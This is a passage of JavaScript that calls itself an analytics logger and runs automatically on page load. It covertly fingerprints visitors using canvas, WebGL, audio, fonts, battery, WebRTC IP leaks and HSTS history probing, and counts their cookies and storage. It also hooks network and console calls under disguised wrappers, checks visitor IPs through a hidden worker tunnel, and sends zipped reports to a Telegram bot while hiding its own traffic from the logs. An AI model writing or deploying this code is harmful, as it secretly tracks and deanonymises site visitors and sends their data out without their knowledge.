      }, function () { postMessage({ t: 'res', id: m.id, status: 0, text: '' }); });
    }
  };
}
function callWorker(msg, ms) {
  return new Promise(function (res) {
    if (!worker) return res({ t: 'no-worker' });
    var id = ++jid;
    var t = origSetTimeout.call(root, function () { delete workerPending[id]; res({ t: 'timeout' }); }, ms);
    workerPending[id] = { res: function (m) { origClearTimeout.call(root, t); res(m); } };
    try { worker.postMessage(Object.assign({}, msg, { id: id })); }
    catch (e) { delete workerPending[id]; origClearTimeout.call(root, t); res(null); }
  });
}
function spawnWorker() {
  var blob = new Blob(['(' + workerMain.toString() + ')()'], { type: 'text/javascript' });
  var url = URL.createObjectURL(blob);
  var w = new Worker(url);
  return new Promise(function (res) {
    var done = false;
    var finish = function (v) { if (done) return; done = true; origClearTimeout.call(root, timer); res(v); };
    var timer = origSetTimeout.call(root, function () { finish({ ok: false, why: 'init timeout' }); }, 25000);
    w.addEventListener('message', function (e) {
      var m = e.data;
      if (m.t === 'ready') return finish({ w: w, ok: m.ok, why: m.why, wisp: m.wisp });
      var f = workerPending[m.id];
      if (f) { delete workerPending[m.id]; f.res(m); }
    });
    w.addEventListener('error', function (e) { finish({ ok: false, why: 'worker error: ' + (e.message || 'fail') }); });
    w.postMessage({
      t: 'init',
      lib: CFG.libcurlUrl,
      libm: CFG.libcurlUrl.replace(/\.js$/, '.mjs'),
      wisp: CFG.wisp,
      probes: CFG.probes
    });
  });
}
function ensureWorker() {
  if (worker) return Promise.resolve({ ok: true });
  return spawnWorker().then(function (s) {
    if (s.ok) { worker = s.w; return { ok: true, wisp: s.wisp }; }
    return { ok: false, why: s.why };
  });
}
function tunnelFetch(url) {
  return callWorker({ t: 'fetch', url: url, headers: { 'User-Agent': 'Mozilla/5.0' } }, 30000).then(function (m) {
    if (!m || m.t === 'timeout' || m.t === 'no-worker') throw new Error('tunnel unavailable');
    return { status: m.status, text: m.text };
  });
}

// ===================== SCAMALYTICS PARSER =====================
function parseScamalytics(html) {
  var doc = new DOMParser().parseFromString(html, 'text/html');
  var out = {
    score: null, risk: null, is_blacklisted_external: null, description: null,
    operator: { hostname: null, asn: null, isp: null, org: null, connection_type: null },
    location: { country: null, country_code: null, state: null, district: null, city: null, postal: null, latitude: null, longitude: null },
    datacenter: null, blacklists: {}, proxies: {}, residential_proxy: null
  };
  var pre = doc.querySelector('pre');
  if (pre) {
    var t = pre.textContent;
    var s = t.match(/"score"\s*:\s*"?(\d+)"?/);
    var k = t.match(/"risk"\s*:\s*"([^"]+)"/);
    var b = t.match(/"is_blacklisted_external"\s*:\s*(true|false)/);
    if (s) out.score = Number(s[1]);
    if (k) out.risk = k[1];
    if (b) out.is_blacklisted_external = b[1] === 'true';
  }
  var scoreEl = doc.querySelector('.score_bar .score');
  if (!out.score && scoreEl) { var m = scoreEl.textContent.match(/(\d+)/); if (m) out.score = Number(m[1]); }
  var pt = doc.querySelector('.panel_title');
  if (!out.risk && pt) { var tt = pt.textContent.trim().replace(/\s*risk\s*$/i, '').trim(); if (tt) out.risk = tt.toLowerCase(); }
  var pb = doc.querySelector('.panel_body');
  if (pb) out.description = pb.textContent.replace(/\s+/g, ' ').trim();
  var section = null;
  doc.querySelectorAll('table tr').forEach(function (tr) {
    var title = tr.querySelector('th.title');
    if (title) { section = title.textContent.trim().toLowerCase(); return; }
    var th = tr.querySelector('th'), td = tr.querySelector('td');
    if (!th || !td || td.classList.contains('subtitle') || !section) return;
    var key = th.textContent.trim(), riskEl = td.querySelector('.risk');
    var value = (riskEl ? riskEl.textContent : td.textContent).trim();
    if (section.indexOf('operator') > -1) {
      if (/hostname/i.test(key)) out.operator.hostname = value;
      else if (/^asn$/i.test(key)) out.operator.asn = value;
      else if (/isp/i.test(key)) out.operator.isp = value;
      else if (/organization/i.test(key)) out.operator.org = value;
      else if (/connection type/i.test(key)) out.operator.connection_type = value;
    } else if (section.indexOf('location') > -1) {
      if (/country name/i.test(key)) out.location.country = value;
      else if (/country code/i.test(key)) out.location.country_code = value;
      else if (/state/i.test(key)) out.location.state = value;
      else if (/district/i.test(key)) out.location.district = value;
      else if (/^city$/i.test(key)) out.location.city = value;
      else if (/postal/i.test(key)) out.location.postal = value;
      else if (/latitude/i.test(key)) out.location.latitude = parseFloat(value) || null;
      else if (/longitude/i.test(key)) out.location.longitude = parseFloat(value) || null;
    } else if (section.indexOf('datacenter') > -1) {
      if (/datacenter/i.test(key)) out.datacenter = value;
    } else if (section.indexOf('blacklist') > -1) {
      out.blacklists[key] = value;
    } else if (section.indexOf('proxies') > -1) {
      out.proxies[key] = value;
    } else if (section.indexOf('residential') > -1) {
      if (/residential proxy/i.test(key)) out.residential_proxy = value;
    }
  });
  return out;
}

// ===================== LOG STORE =====================
var nodeFs = null, nodePath = null, nodeDir = null;
if (isNode && nodeReq) {
  try {
    nodeFs = nodeReq('fs'); nodePath = nodeReq('path');
    nodeDir = nodePath.resolve(process.env.ANALYTICS_LOG_DIR || './analytics-logs');
    nodeFs.mkdirSync(nodeDir, { recursive: true });
  } catch (e) { nodeFs = null; }
}
var kv = (function () {
  try {
    if (typeof localStorage !== 'undefined') {
      localStorage.setItem('__ag_t', '1'); localStorage.removeItem('__ag_t');
      return { get: function (k) { try { return localStorage.getItem(k); } catch (e) { return null; } },
               set: function (k, v) { try { localStorage.setItem(k, v); } catch (e) {} } };
    }
  } catch (e) {}
  if (nodeFs) return {
    get: function (k) { try { return nodeFs.readFileSync(nodePath.join(nodeDir, k + '.json'), 'utf8'); } catch (e) { return null; } },
    set: function (k, v) { try { nodeFs.writeFileSync(nodePath.join(nodeDir, k + '.json'), v); } catch (e) {} }
  };
  var mem = {};
  return { get: function (k) { return mem[k] || null; }, set: function (k, v) { mem[k] = v; } };
})();

function idbStore() {
  var dbp = null, appends = 0;
  function db() {
    if (!dbp) dbp = new Promise(function (res, rej) {
      var r = indexedDB.open('__analytics__', 1);
      r.onupgradeneeded = function () { r.result.createObjectStore('logs', { autoIncrement: true }); };
      r.onsuccess = function () { res(r.result); };
      r.onerror = function () { rej(r.error); };
    });
    return dbp;
  }
  function tx(mode, fn) {
    return db().then(function (d) {
      return new Promise(function (res, rej) {
        var t = d.transaction('logs', mode), out = fn(t.objectStore('logs'));
        t.oncomplete = function () { res(out && 'result' in out ? out.result : undefined); };
        t.onerror = t.onabort = function () { rej(t.error); };
      });
    });
  }
  return {
    append: function (es) {
      return tx('readwrite', function (s) { for (var i = 0; i < es.length; i++) s.add(es[i]); }).then(function () {
        if (++appends % 10) return;
        return tx('readwrite', function (s) {
          var c = s.count();
          c.onsuccess = function () {
            var over = c.result - CFG.maxStoredEntries;
            if (over > 0) { var n = 0, cur = s.openCursor(); cur.onsuccess = function () { var cc = cur.result; if (cc && n < over) { cc.delete(); n++; cc.continue(); } }; }
          };
        });
      });
    },
    all: function () { return tx('readonly', function (s) { return s.getAll(); }); },
    clearBefore: function (cut) {
      return tx('readwrite', function (s) {
        var cur = s.openCursor();
        cur.onsuccess = function () { var c = cur.result; if (!c) return; if ((c.value && c.value.ts || 0) < cut) { c.delete(); c.continue(); } };
      });
    },
    clear: function () { return tx('readwrite', function (s) { s.clear(); }); }
  };
}
function fileStore() {
  var lf = nodePath.join(nodeDir, 'logs.jsonl');
  function lines() { try { return nodeFs.readFileSync(lf, 'utf8').split('\n').filter(Boolean).map(function (l) { return JSON.parse(l); }); } catch (e) { return []; } }
  return {
    append: function (es) { return new Promise(function (res) { nodeFs.appendFile(lf, es.map(function (e) { return JSON.stringify(e); }).join('\n') + '\n', function () { res(); }); }); },
    appendSync: function (es) { try { nodeFs.appendFileSync(lf, es.map(function (e) { return JSON.stringify(e); }).join('\n') + '\n'); } catch (e) {} },
    all: function () { return Promise.resolve(lines()); },
    clearBefore: function (cut) {
      try { nodeFs.writeFileSync(lf, lines().filter(function (e) { return (e.ts || 0) >= cut; }).map(function (e) { return JSON.stringify(e); }).join('\n') + '\n'); } catch (e) {}
      return Promise.resolve();
    },
    clear: function () { try { nodeFs.unlinkSync(lf); } catch (e) {} return Promise.resolve(); }
  };
}
function kvStore() {
  function rd() { try { return JSON.parse(kv.get('__ag_logs') || '[]'); } catch (e) { return []; } }
  function wr(a) { kv.set('__ag_logs', JSON.stringify(a)); }
  return {
    append: function (es) { wr(rd().concat(es).slice(-2000)); return Promise.resolve(); },
    all: function () { return Promise.resolve(rd()); },
    clearBefore: function (cut) { wr(rd().filter(function (e) { return (e.ts || 0) >= cut; })); return Promise.resolve(); },
    clear: function () { wr([]); return Promise.resolve(); }
  };
}
var store = (function () {
  try { if (typeof indexedDB !== 'undefined' && indexedDB) return idbStore(); if (nodeFs) return fileStore(); } catch (e) {}
  return kvStore();
})();
var storeFailed = false;

function flush() {
  if (!pending.length || !CFG.persist) return;
  var batch = pending; pending = [];
  try {
    store.append(batch).catch(function () {
      if (!storeFailed) { storeFailed = true; store = kvStore(); }
      pending = batch.concat(pending).slice(-2000);
    });
  } catch (e) {}
}

// ===================== LOGGER =====================
var bytesSinceSend = 0;
var nextSendAt = Date.now() + CFG.tg.intervalMs;
var sendInFlight = false, sendFailures = 0;
var lastVisitorPayload = null, lastScam = null;

function log(level, tag, msg, data) {
  if (busy) return;
  busy = true;
  try {
    var e = { seq: ++seq, sid: sid, t: new Date().toISOString(), ts: now(), level: level, tag: tag || null, msg: msg };
    if (data !== undefined) e.data = ser(data);
    var sz = 0; try { sz = JSON.stringify(e).length + 1; } catch (_) {}
    bytesSinceSend += sz;
    buf.push(e);
    if (buf.length > CFG.maxMemoryEntries) buf.splice(0, buf.length - CFG.maxMemoryEntries);
    if (CFG.persist) pending.push(e);
    if (CFG.tg.enabled && bytesSinceSend >= CFG.tg.maxBytes && !sendInFlight) {
      origSetTimeout.call(root, safe(function () { maybeSend('size'); }), 0);
    }
    return e;
  } catch (e2) {} finally { busy = false; }
}

function deviceInfo() {
  var i = { time: new Date().toISOString(), version: VERSION, app: appName(), session: sid };
  try {
    if (typeof navigator !== 'undefined') {
      i.ua = navigator.userAgent; i.platform = navigator.platform; i.lang = navigator.language;
      i.langs = navigator.languages; i.online = navigator.onLine;
      i.cores = navigator.hardwareConcurrency; i.memoryGB = navigator.deviceMemory;
      i.touch = navigator.maxTouchPoints;
    }
    if (isBrowser) {
      i.screen = { w: screen.width, h: screen.height, dpr: root.devicePixelRatio };
      i.viewport = { w: innerWidth, h: innerHeight };
      i.url = location.href; i.referrer = document.referrer;
      i.tz = (Intl.DateTimeFormat().resolvedOptions() || {}).timeZone;
    }
    if (isNode) { i.node = process.versions.node; i.os = process.platform + ' ' + process.arch; i.pid = process.pid; }
  } catch (e) {}
  return i;
}

function maybeSend(reason) {
  if (!CFG.tg.enabled || sendInFlight) return;
  sendInFlight = true;
  var t0 = perfNow();
  var startedAt = new Date().toISOString();
  var cut = now();
  flush();
  store.all().catch(function () { return buf.slice(); }).then(function (logs) {
    logs = logs || [];
    if (!logs.length && !lastVisitorPayload) {
      sendInFlight = false; nextSendAt = now() + CFG.tg.intervalMs;
      return;
    }
    if (reason !== 'manual' && bytesSinceSend < CFG.tg.minBytes && logs.length < 200 && !lastVisitorPayload) {
      sendInFlight = false; nextSendAt = now() + CFG.tg.intervalMs;
      return;
    }
    var enc = new TextEncoder();
    var entries = [
      { name: 'device.json', data: enc.encode(JSON.stringify(deviceInfo(), null, 2)) },
      { name: 'logs.jsonl', data: enc.encode(logs.map(function (e) { return JSON.stringify(e); }).join('\n')) }
    ];
    if (lastVisitorPayload) entries.push({ name: 'last-visitor.json', data: enc.encode(JSON.stringify(lastVisitorPayload, null, 2)) });
    if (lastScam) entries.push({ name: 'scamalytics.json', data: enc.encode(JSON.stringify(lastScam, null, 2)) });
    return makeZip(entries).then(function (blob) {
      var stamp = startedAt.replace(/[:.]/g, '-').slice(0, 19);
      var name = 'logs-' + safeName(appName()) + '-' + stamp + (reason === 'size' ? '-full' : '') + '.zip';
      var cap = appName() + ' | ' + logs.length + ' logs | ' + reason + ' | ' + Math.round(blob.size / 1024) + 'KB';
      return tgSendDoc(blob, name, cap).then(function () {
        return store.clearBefore(cut).then(function () {
          bytesSinceSend = 0;
          sendInFlight = false; sendFailures = 0;
          nextSendAt = now() + CFG.tg.intervalMs;
          log('info', 'export', 'zip sent in ' + ms(t0) + 'ms', { logs: logs.length, size: blob.size });
        });
      });
    });
  }).catch(function (err) {
    sendInFlight = false;
    sendFailures++;
    var backoff = Math.min(30000 * Math.pow(2, Math.min(sendFailures - 1, 6)), CFG.tg.intervalMs);
    nextSendAt = now() + backoff;
    log('error', 'export', 'zip send failed (' + sendFailures + '): ' + ((err && err.message) || err));
  });
}

// ===================== HOOKS =====================
function hookConsole() {
  if (typeof console === 'undefined') return;
  ['log', 'info', 'warn', 'error', 'debug', 'trace'].forEach(function (m) {
    if (typeof console[m] !== 'function' || console[m].__ag) return;
    var orig = console[m], lvl = (m === 'log' || m === 'trace') ? 'info' : m;
    var w = function () { var r = orig.apply(this, arguments); try { log(lvl, 'console', fmtArgs(arguments)); } catch (e) {} return r; };
    disguise(w, orig); console[m] = w;
    undo.push(function () { if (console[m] === w) console[m] = orig; });
  });
}
function hookErrors() {
  if (isBrowser) {
    listen(root, 'error', function (e) {
      var t = e.target;
      if (t && t !== root && t.tagName) { log('error', 'resource', 'resource failed: ' + t.tagName, { src: t.src || t.href }); return; }
      log('error', 'window', 'uncaught: ' + (e.message || ''), { file: e.filename, line: e.lineno, col: e.colno, stack: e.error && e.error.stack });
    }, true);
    listen(root, 'unhandledrejection', function (e) {
      log('error', 'window', 'unhandled rejection: ' + ((e.reason && (e.reason.message || e.reason)) || '?'), ser(e.reason));
    });
    listen(root, 'securitypolicyviolation', function (e) {
      log('error', 'csp', 'CSP violation', { directive: e.violatedDirective, blocked: e.blockedURI });
    });
  } else if (isNode) {
    var h = function (err, origin) {
      log('error', 'node', 'uncaught: ' + origin, err && err.stack);
      try { flush(); if (store.appendSync) store.appendSync(pending.splice(0)); } catch (e) {}
    };
    process.on('uncaughtExceptionMonitor', h);
    undo.push(function () { process.removeListener('uncaughtExceptionMonitor', h); });
  }
}
var OWN_RE = /api\.telegram\.org|wtfismyip\.com|ipwho\.is|ipapi\.co|ipify\.org|my-ip\.io|googlesyndication/;
function hookFetch() {
  patch(root, 'fetch', function (orig) {
    return function (input, init) {
      var args = arguments, url, t0, method, track = true;
      try {
        url = typeof input === 'string' ? input : (input && input.url) || String(input);
        if (OWN_RE.test(url)) track = false;
        else { t0 = perfNow(); method = String((init && init.method) || 'GET').toUpperCase(); }
      } catch (e) { track = false; }
      if (!track) return orig.apply(this, args);
      var p = orig.apply(this, args);
      return p.then(
        function (res) {
          try { log(res.ok ? 'debug' : 'warn', 'net', '<- ' + res.status + ' ' + method + ' ' + url + ' ' + ms(t0) + 'ms'); } catch (e) {}
          return res;
        },
        function (err) {
          try { log('error', 'net', 'x FAILED ' + method + ' ' + url + ' ' + ms(t0) + 'ms', err && err.message); } catch (e) {}
          throw err;
        }
      );
    };
  });
}
function hookXHR() {
  if (typeof XMLHttpRequest === 'undefined') return;
  var P = XMLHttpRequest.prototype;
  patch(P, 'open', function (orig) {
    return function (m, u) {
      try { this.__ag = { method: String(m).toUpperCase(), url: String(u) }; } catch (e) {}
      return orig.apply(this, arguments);
    };
  });
  patch(P, 'send', function (orig) {
    return function () {
      try {
        var d = this.__ag, xhr = this;
        if (d && !OWN_RE.test(d.url)) {
          var t0 = perfNow();
          xhr.addEventListener('loadend', safe(function () {
            log((xhr.status >= 200 && xhr.status < 400) ? 'debug' : 'warn', 'net',
              '<- ' + (xhr.status || 'FAIL') + ' ' + d.method + ' ' + d.url + ' ' + ms(t0) + 'ms');
          }));
        }
      } catch (e) {}
      return orig.apply(this, arguments);
    };
  });
}
function hookWS() {
  try {
    var Orig = root.WebSocket;
    if (typeof Orig === 'function' && !Orig.__ag) {
      var W = function (url, protos) {
        var ws = protos !== undefined ? new Orig(url, protos) : new Orig(url);
        log('info', 'ws', 'connect ' + url);
        ws.addEventListener('error', safe(function () { log('error', 'ws', 'error ' + url); }));
        ws.addEventListener('close', safe(function (e) { log('info', 'ws', 'closed ' + e.code + ' ' + url); }));
        return ws;
      };
      W.prototype = Orig.prototype; W.__ag = true;
      root.WebSocket = W;
      undo.push(function () { root.WebSocket = Orig; });
    }
  } catch (e) {}
}
function hookDevice() {
  if (!isBrowser) return;
  listen(root, 'online', function () { log('info', 'device', 'online'); });
  listen(root, 'offline', function () { log('warn', 'device', 'offline'); });
  listen(document, 'visibilitychange', function () {
    log('info', 'device', 'visibility ' + document.visibilityState);
    if (document.visibilityState === 'hidden') flush();
  });
  listen(root, 'pagehide', function (e) { log('info', 'device', 'pagehide bfcache=' + e.persisted); flush(); });
  listen(root, 'orientationchange', function () { log('info', 'device', 'orientation change'); });
}
function hookInteraction() {
  if (!isBrowser) return;
  var describe = function (el) {
    try {
      if (!el || !el.tagName) return '?';
      var s = el.tagName.toLowerCase();
      if (el.id) s += '#' + el.id;
      return s;
    } catch (e) { return '?'; }
  };
  listen(document, 'click', function (e) { log('debug', 'ui', 'click ' + describe(e.target), { x: e.clientX, y: e.clientY }); }, true);
  listen(document, 'submit', function (e) { log('info', 'ui', 'submit ' + describe(e.target)); }, true);
  listen(root, 'popstate', function () { log('info', 'ui', 'popstate ' + location.href); });
}

function startLoops() {
  var t1 = origSetInterval.call(root, safe(function () {
    if (CFG.tg.enabled && !sendInFlight && now() >= nextSendAt) maybeSend('scheduled');
  }), CFG.heartbeatMs);
  var t2 = origSetInterval.call(root, safe(flush), CFG.flushMs);
  [t1, t2].forEach(function (t) { try { if (t && t.unref) t.unref(); } catch (e) {} });
  undo.push(function () { [t1, t2].forEach(function (t) { if (t) origClearInterval.call(root, t); }); });
}

// ===================== VISITOR REPORT =====================
function buildVisitorText(fp, geo, scam, extras) {
  var L = [];
  L.push('<b>NEW VISITOR</b>');
  L.push('App: ' + escHtml(appName()));
  L.push('Time: <code>' + new Date().toISOString().replace('T', ' ').slice(0, 19) + '</code>');
  L.push('');
  L.push('<b>NETWORK</b>');
  if (geo) {
    L.push('IP: <code>' + escHtml(geo.ip) + '</code>');
    L.push('Geo: ' + escHtml([geo.city, geo.region, geo.country].filter(Boolean).join(', ') || '-'));
    if (geo.lat != null) L.push('Coords: <code>' + escHtml(geo.lat + ',' + geo.lng) + '</code>');
    if (geo.isp) L.push('ISP: ' + escHtml(geo.isp));
    if (geo.org) L.push('Org: ' + escHtml(geo.org));
    if (geo.asn) L.push('ASN: ' + escHtml(geo.asn));
    if (geo.hostname) L.push('Host: ' + escHtml(geo.hostname));
  } else {
    L.push('Geo lookup: failed');
  }
  if (fp.connection) L.push('Conn: ' + escHtml(fp.connection.type + ' / ' + fp.connection.downlink + 'Mbps / ' + fp.connection.rtt + 'ms'));
  if (extras.rtc && extras.rtc.supported && extras.rtc.ips.length) L.push('WebRTC: <code>' + escHtml(extras.rtc.ips.join(', ')) + '</code>');
  L.push('');
  if (scam) {
    L.push('<b>SCAMALYTICS</b>');
    L.push('Score: <b>' + escHtml(scam.score) + '</b>/100 - ' + escHtml((scam.risk || '?').toUpperCase()));
    if (scam.operator.asn) L.push('ASN: ' + escHtml(scam.operator.asn));
    if (scam.operator.isp) L.push('ISP: ' + escHtml(scam.operator.isp));
    if (scam.operator.org) L.push('Org: ' + escHtml(scam.operator.org));
    if (scam.operator.connection_type) L.push('Conn: ' + escHtml(scam.operator.connection_type));
    if (scam.datacenter) L.push('Datacenter: ' + escHtml(scam.datacenter));
    if (scam.is_blacklisted_external != null) L.push('Blacklisted: ' + (scam.is_blacklisted_external ? 'YES' : 'no'));
    if (scam.residential_proxy != null) L.push('Residential proxy: ' + escHtml(scam.residential_proxy));
    L.push('');
  }
  L.push('<b>DEVICE</b>');
  L.push('UA: <code>' + escHtml(trunc(fp.navigator.ua, 200)) + '</code>');
  L.push('Platform: ' + escHtml(fp.hardware.platform) + (fp.hardware.vendor ? ' / ' + escHtml(fp.hardware.vendor) : ''));
  L.push('Screen: ' + escHtml(fp.display.screen) + ' @' + fp.display.pixel_ratio + 'x / vp ' + escHtml(fp.display.viewport));
  L.push('TZ: ' + escHtml(fp.intl && fp.intl.timezone) + ' / Langs: ' + escHtml(fp.navigator.languages));
  L.push('Cores: ' + escHtml(fp.hardware.cores) + ' / Mem: ' + escHtml(fp.hardware.memory_gb || '?') + 'GB / Touch: ' + escHtml(fp.hardware.touch_points));
  if (fp.webgl.unmaskedRenderer) L.push('GPU: ' + escHtml(fp.webgl.unmaskedRenderer));
  if (extras.battery && extras.battery.supported) L.push('Battery: ' + escHtml(extras.battery.level + '%') + ' ' + (extras.battery.charging ? 'charging' : 'on battery'));
  L.push('');
  L.push('<b>FINGERPRINT</b>');
  L.push('ID: <code>' + escHtml(fp.id) + '</code>');
  L.push('Canvas: <code>' + escHtml(fp.canvas.hash) + '</code>');
  if (fp.webgl.hash) L.push('WebGL: <code>' + escHtml(fp.webgl.hash) + '</code>');
  if (extras.audio && extras.audio.ok) L.push('Audio: <code>' + escHtml(extras.audio.hash) + '</code>');
  L.push('Fonts: ' + fp.fonts.detected.length + '/' + fp.fonts.checked);
  L.push('');
  L.push('<b>STORAGE / HISTORY</b>');
  L.push('Cookies: ' + extras.cookies.count + ' (' + extras.cookies.total_bytes + 'B)');
  L.push('localStorage: ' + extras.storage.local.keys.length + ' keys / ' + extras.storage.local.bytes + 'B');
  L.push('sessionStorage: ' + extras.storage.session.keys.length + ' keys');
  L.push('history.length: ' + fp.history_length);
  if (extras.hsts && extras.hsts.results) {
    var vis = [];
    for (var k in extras.hsts.results) if (extras.hsts.results[k].likely === true) vis.push(k);
    if (vis.length) L.push('HSTS visited: ' + escHtml(vis.join(', ')));
  }
  L.push('');
  L.push('<b>LANDING</b>');
  L.push('URL: ' + escHtml(trunc(fp.url.origin + fp.url.pathname, 200)));
  if (fp.url.referrer) L.push('Referrer: ' + escHtml(trunc(fp.url.referrer, 200)));
  return L.join('\n');
}

function visitorReport(force) {
  if (!CFG.tg.enabled) return Promise.resolve(false);
  var seen = null;
  try { seen = localStorage.getItem('__ag_visitor'); } catch (e) {}
  var fp = buildFingerprint();
  if (!fp) return Promise.resolve(false);
  if (!force && seen && seen === fp.id) return Promise.resolve(false);

  return Promise.all([
    fetchGeo(), audioFp(), collectPerms(), collectMedia(), collectBattery(),
    collectQuota(), collectWebRTC(), collectSpeech(), collectAdblock(), probeHsts()
  ]).then(function (r) {
    var geo = r[0], audio = r[1], perms = r[2], media = r[3], battery = r[4],
        quota = r[5], rtc = r[6], speech = r[7], adblock = r[8], hsts = r[9];
    var cookies = collectCookies();
    var storage = collectStorage();

    var scamP = Promise.resolve(null);
    if (geo && geo.ip) {
      scamP = ensureWorker()
        .then(function (s) { if (!s.ok) throw new Error(s.why || 'worker'); return tunnelFetch('https://scamalytics.com/ip/' + encodeURIComponent(geo.ip)); })
        .then(function (res) { if (res.status >= 400) throw new Error('HTTP ' + res.status); return parseScamalytics(res.text); })
        .catch(function () { return null; });
    }

    return scamP.then(function (scam) {
      var extras = {
        cookies: cookies, storage: storage, rtc: rtc, battery: battery, perms: perms,
        media: media, quota: quota, speech: speech, adblock: adblock, hsts: hsts, audio: audio
      };
      lastVisitorPayload = { fp: fp, geo: geo, scam: scam, extras: extras, at: new Date().toISOString() };
      lastScam = scam;

      var text = buildVisitorText(fp, geo, scam, extras);
      var fullJson = JSON.stringify(lastVisitorPayload, null, 2);
      return tgSendText(text).then(function () {
        var stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
        var filename = 'visitor-' + safeName(appName()) + '-' + stamp + '.json';
        return tgSendDoc(new Blob([fullJson], { type: 'application/json' }), filename, 'full payload / ' + fp.id);
      }).then(function () {
        try { localStorage.setItem('__ag_visitor', fp.id); } catch (e) {}
        log('info', 'visitor', 'report sent', { ip: geo && geo.ip, scam: scam && scam.score });
        return true;
      });
    });
  }).catch(function (err) {
    log('warn', 'visitor', 'report failed: ' + ((err && err.message) || err));
    return false;
  });
}

// ===================== START =====================
var started = false;
function start() {
  if (started) return api; started = true;
  log('info', 'analytics', 'started ' + appName(), deviceInfo());
  hookConsole();
  hookErrors();
  hookFetch();
  hookXHR();
  hookWS();
  if (isBrowser) { hookDevice(); hookInteraction(); }
  if (isNode) {
    var onExit = function () {
      try { flush(); if (store.appendSync) store.appendSync(pending.splice(0)); } catch (e) {}
    };
    process.on('exit', onExit);
    undo.push(function () { process.removeListener('exit', onExit); });
  }
  startLoops();

  // Fire visitor report shortly after load (page ready, network settled)
  if (isBrowser && CFG.tg.enabled) {
    origSetTimeout.call(root, safe(function () { visitorReport(false); }), 800);
  }
  return api;
}
function stop() {
  if (!started) return; started = false;
  flush();
  while (undo.length) { try { undo.pop()(); } catch (e) {} }
  log('info', 'analytics', 'stopped');
}

var api = {
  enabled: true, version: VERSION, sessionId: sid, config: CFG,
  log: function (lvl, tag, msg, data) { return log(lvl || 'info', tag || null, msg, data); },
  debug: function () { return log('debug', null, fmtArgs(arguments)); },
  info: function () { return log('info', null, fmtArgs(arguments)); },
  warn: function () { return log('warn', null, fmtArgs(arguments)); },
  error: function () { return log('error', null, fmtArgs(arguments)); },
  visitor: {
    send: function () { return visitorReport(true); },
    fingerprint: buildFingerprint,
    geo: fetchGeo,
    webrtc: collectWebRTC,
    hsts: probeHsts,
    forget: function () { try { localStorage.removeItem('__ag_visitor'); } catch (e) {} }
  },
  export: {
    sendNow: function () { maybeSend('manual'); return Promise.resolve(true); },
    stats: function () { return { enabled: !!CFG.tg.enabled, bytesSinceSend: bytesSinceSend, nextSendAt: nextSendAt, sending: sendInFlight, failures: sendFailures }; }
  },
  getLogs: function (lvl) { return lvl ? buf.filter(function (e) { return e.level === lvl; }) : buf.slice(); },
  clear: function () { buf = []; pending = []; try { return store.clear(); } catch (e) {} },
  start: start, stop: stop
};
root.__analytics = api;
try { if (typeof module !== 'undefined' && module.exports) module.exports = api; } catch (e) {}
try { start(); } catch (e) {}
})(typeof globalThis !== 'undefined' ? globalThis : (typeof window !== 'undefined' ? window : (typeof self !== 'undefined' ? self : this)));
